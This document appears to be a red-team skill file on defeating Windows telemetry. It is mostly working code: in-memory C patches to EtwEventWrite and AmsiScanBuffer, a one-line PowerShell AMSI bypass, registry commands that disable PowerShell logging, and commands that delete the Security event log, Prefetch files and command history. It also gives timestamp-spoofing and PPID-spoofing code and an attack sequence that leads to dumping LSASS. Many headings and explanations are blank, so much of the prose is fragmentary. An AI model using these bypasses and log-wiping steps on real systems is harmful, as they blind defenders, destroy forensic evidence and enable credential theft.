# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Authorized red-team operations, adversary simulations, and testing of owned products only; do not use against unauthorized targets.

EDR detection relies heavily on the ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface) telemetry pipelines.
This document summarizes red-team countermeasures for these pipelines and adds anti-forensics combinations involving Sysmon, PowerShell logging, and timestamp spoofing.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internals

ETW is a high-performance event-tracing framework built into Windows; EDRs use it for lightweight kernel telemetry.
Providers of primary interest to red teams:

| Provider GUID | Name | Users |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

###  API

| API | DLL |  |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` |  |
| `EtwEventWriteFull` | `ntdll.dll` |  activity ID  |
| `EtwEventWriteEx` | `ntdll.dll` |  |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite  |
| `NtTraceControl` | `ntdll.dll` |  trace session// provider |
| `EtwEventEnabled` | `ntdll.dll` | provider  |
| `EtwEventRegister` | `ntdll.dll` |  provider |

###

```text
 EventWrite(...)
    (TraceLogging API)
   ntdll!EtwEventWrite[Full|Ex]
   ntdll!NtTraceEvent (syscall)
   nt!NtTraceEvent ()
    ETW core  EDR  session
```

## 2. ETW Patch

###  AEtwEventWrite head patch

 `ntdll!EtwEventWrite`

```text

  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patch x64
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // VirtualProtect  hook ->  indirect syscall
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC ** ntdll  ETW-TI  `ALPC_MODIFY_PROCESS` / `PROTECTVM`
 ** indirect syscall +  NtProtectVirtualMemory hook  patch**
 patch  EDR

###  BEtwEventEnabled always-false

 `EtwEventWrite` `EtwEventEnabled`  FALSE
 "provider "   `EtwEventWrite` hash  EDR  `EtwEventWrite`

```c
// EtwEventEnabled  BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

###  CNtTraceControl  provider

 syscall  EDR session ntdll

```c
// NtTraceControl(EtwpStopTrace, ...)
//  SeSystemProfilePrivilege
//  Local Admin + UAC bypass
```



-  session "ETW provider stopped"
-

###  D ETW patch BYOVD/

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
 0  ETW-TI
```

 attack-chain  BYOVD  skill

## 3. AMSI Bypass

AMSI  Windows  PowerShell / .NET / WMI / VBA
 PowerShell + AMSI

###  AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32)  ret (64)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell  / Defender

```powershell
#  / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

###  1Hardware Breakpoint AMSI Bypass

 amsi.dll

1. AddVectoredExceptionHandler
2.  `AmsiScanBuffer`  `DR0`
3. VEH  `RAX = 0x80070057``RIP = ret ``RSP += 8`
4. ContinueExecution

 unhook-techniques.md  HWBP Blindside  VEH

###  2AmsiContext / AmsiSession

 `AmsiContext`  `AmsiScanBuffer`  success

```text
// AmsiContext  "AMSI"
//  "XXXX"  AmsiScanBuffer  S_OK + AMSI_RESULT_CLEAN
```

###  3Reflective  amsi.dll

 amsi.dll PowerShell  AMSI
 PowerShell.exe  EDR

## 4.

### PowerShell ScriptBlock Logging

```powershell
#
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy
# Computer Configuration  Administrative Templates  Windows Components
#   Windows PowerShell  Turn on PowerShell Script Block Logging = Disabled
```

###  PowerShell history

```powershell
#
Clear-History
#  history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

###  Prefetch

```powershell
#  SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
#
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

###  ETL log

```powershell
#  session  etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
#  .evtx  Event Log Service  "log cleared"  (Event ID 1102)
#  patch wevtsvc.dll  EventLog API T1070.001
```

###  spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon

Sysmon  olaf


| Event ID |  |
|----------|------|
| 1 | ProcessCreate PPIDCommandLineHash |
| 7 | ImageLoadDLL  |
| 8 | CreateRemoteThread |
| 10 | ProcessAccessOpenProcess |
| 11 | FileCreate |
| 12/13/14 |  |
| 22 | DNS Query |
| 25 | ProcessTamperingimage hollowing |

###

1. ****   Event ID 1
2. **PPID Spoof**   `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`  PPID  `explorer.exe` Sysmon ProcessCreate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + **  Process Hollowing  Sysmon  Event ID 25
    **module stomping** DLL  **dirty vanity**
    PPID spoof
4. ****   Event ID 8 `NtCreateThreadEx`  / APC / Early Bird APC
5. **DNS  DoH / HTTPS**   Event ID 22

## 6. Call Stack Spoof +

 ProcessCreate  spawn child

-  CommandLine
- PPID spoof  services.exe SCM
-  ImageLoad  Image hash module stomping  implant  DLL
-  CallStackSpooferSysmon  EnableCallTracing  implant

## 7.  OPSEC

** EDR **



```text
1. AMSI bypass (HWBP  amsi.dll)
     .NET / PowerShell  implant
2. ETW patch ( patch EtwEventWrite syscall)

3. NtProtectVirtualMemory  indirect syscall
    ""
4. Unhook ntdll (Peruns Fart)  enable indirect syscall
     hook
5. Call stack spoof setup
     syscall
6.  payload  ( /  / dump LSASS)
7.  (PowerShell history / Prefetch / )
```



```text
  unhook ntdll  ETW-TI  PROTECTVM + module modification  SOC
  dump LSASS  AMSI / ETW    T1003.001
 AMSI  ETW  unhook  spoof  payload
```

##

- ETW Threat Intelligence Provider<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging)<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking)<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal)<https://attack.mitre.org/techniques/T1070/>

##

hook   unhook  telemetry  `SKILL.md` Step 5  sandbox
 `attack-chain/`  initial access  lateral movement
